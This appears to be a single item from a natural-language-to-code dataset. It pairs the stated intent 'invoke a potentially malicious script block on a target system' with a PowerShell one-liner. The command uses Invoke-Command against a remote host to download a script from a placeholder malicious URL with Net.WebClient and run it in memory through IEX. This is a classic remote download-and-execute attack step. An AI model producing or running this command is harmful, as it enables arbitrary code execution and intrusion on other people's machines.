# Natural language intent:
# Invoke a potentially malicious script block on a target system.

Invoke-Command -ComputerName <target_system> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('https://malicious_script.ps1')}
